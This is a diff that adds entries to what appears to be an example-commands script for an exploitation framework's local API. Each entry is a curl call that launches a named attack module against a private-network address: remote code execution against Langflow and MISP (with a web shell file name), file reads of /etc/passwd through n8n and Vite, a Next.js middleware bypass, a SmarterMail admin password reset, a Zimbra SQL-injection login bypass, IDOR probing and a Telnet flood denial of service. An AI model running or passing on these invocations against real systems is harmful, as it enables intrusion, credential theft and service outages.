+# Comprehensive API attack suite — auto-discovers endpoints, probes
+# BOLA/IDOR, missing rate limits, GraphQL DoS, etc. Many prompts.
+# Prompts: auto_mode (y/n), request_input_mode, raw, request_file,
+# timeout, concurrency, idor_probe (y/n), idor_range, rate_probe,
+# rate_burst, graphql_dos (y/n), extra_endpoints
+curl -s --max-time 600 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/api_attack_suite",
+    "target": "https://api.example.com",
+    "prompts": {
+      "auto_mode": "y",
+      "request_input_mode": "auto",
+      "timeout": "10",
+      "concurrency": "8",
+      "idor_probe": "y",
+      "idor_range": "25",
+      "rate_probe": "n",
+      "graphql_dos": "n",
+      "extra_endpoints": ""
+    }
+  }' | python3 -m json.tool
+
+# ─── 240. Langflow build_public_tmp RCE CVE-2026-33017 ────────────
+# Prompts: port, scheme, command (required)
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/langflow/cve_2026_33017_build_public_tmp_rce",
+    "target": "192.168.1.50",
+    "prompts": {
+      "port": "7860",
+      "scheme": "http",
+      "command": "id"
+    }
+  }' | python3 -m json.tool
+
+# ─── 241. MISP RCE CVE-2025-27364 ─────────────────────────────────
+# Prompts: port, scheme, email, password, shell_name, command
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/misp_rce_cve_2025_27364",
+    "target": "192.168.1.60",
+    "prompts": {
+      "port": "443",
+      "scheme": "https",
+      "email": "user@example.com",
+      "password": "password123",
+      "shell_name": "sample.php",
+      "command": "id"
+    }
+  }' | python3 -m json.tool
+
+# ─── 242. n8n Form-Trigger AFR CVE-2026-21858 ─────────────────────
+# Prompts: port, scheme, form_path (required), file_to_read
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/n8n/n8n_form_afr_cve_2026_21858",
+    "target": "192.168.1.70",
+    "prompts": {
+      "port": "5678",
+      "scheme": "http",
+      "form_path": "/form/abc123",
+      "file_to_read": "/etc/passwd"
+    }
+  }' | python3 -m json.tool
+
+# ─── 243. Next.js Middleware Bypass CVE-2025-29927 ────────────────
+# Prompts: port, scheme, protected_path, verbose (y/n)
+curl -s --max-time 120 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/nextjs_middleware_bypass_cve_2025_29927",
+    "target": "192.168.1.80",
+    "prompts": {
+      "port": "3000",
+      "scheme": "http",
+      "protected_path": "/admin",
+      "verbose": "n"
+    }
+  }' | python3 -m json.tool
+
+# ─── 244. SmarterMail Admin Password Reset CVE-2026-23760 ─────────
+# Prompts: port, username, new_password (required)
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/smartermail/admin_password_reset_cve_2026_23760",
+    "target": "192.168.1.90",
+    "prompts": {
+      "port": "443",
+      "username": "admin",
+      "new_password": "P0wned!2026"
+    }
+  }' | python3 -m json.tool
+
+# ─── 245. Vite Path Traversal CVE-2025-30208 ──────────────────────
+# Prompts: port (default 5173), custom_file
+curl -s --max-time 60 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/vite_path_traversal_cve_2025_30208",
+    "target": "192.168.1.100",
+    "prompts": {
+      "port": "5173",
+      "custom_file": "/etc/passwd"
+    }
+  }' | python3 -m json.tool
+
+# ─── 246. Zimbra SQLi Auth Bypass CVE-2025-25064 ──────────────────
+# Prompts: port, scheme, email (required)
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/webapps/zimbra_sqli_auth_bypass_cve_2025_25064",
+    "target": "192.168.1.110",
+    "prompts": {
+      "port": "443",
+      "scheme": "https",
+      "email": "admin@example.com"
+    }
+  }' | python3 -m json.tool
+
+# ═══════════════════════════════════════════════════════════════
+# ADDITIONAL DOS MODULE (247)
+# ═══════════════════════════════════════════════════════════════
+
+# ─── 247. Telnet IAC Flood ────────────────────────────────────────
+# WARNING: denial-of-service. Floods Telnet servers with malformed
+# IAC option negotiations.
+# Prompts: port, mode, connections, duration (seconds), verbose,
+# confirm (y/n — required interactive confirmation)
+curl -s --max-time 300 -X POST http://127.0.0.1:8080/api/run \
+  -H 'Authorization: Bearer testkey123' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "module": "exploits/dos/telnet_iac_flood",
+    "target": "192.168.1.200",
+    "prompts": {
+      "port": "23",
+      "mode": "iac-storm",
+      "connections": "100",
+      "duration": "120",
+      "verbose": "n",
+      "confirm": "y"
+    }
   }' | python3 -m json.tool
 
 # ═══════════════════════════════════════════════════════════════
